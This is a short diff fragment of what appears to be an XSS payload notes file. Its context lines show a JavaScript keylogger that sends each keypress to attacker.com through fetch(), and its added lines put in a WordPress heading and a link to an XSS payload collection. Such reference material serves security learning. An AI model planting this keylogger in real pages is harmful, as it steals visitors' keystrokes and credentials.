@@ -21,3 +21,7 @@ document.onkeypress = function(e) {
   fetch("http://attacker.com/log?key=" + e.key);
 };
 ```
+
+---
+## ## WordPress
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
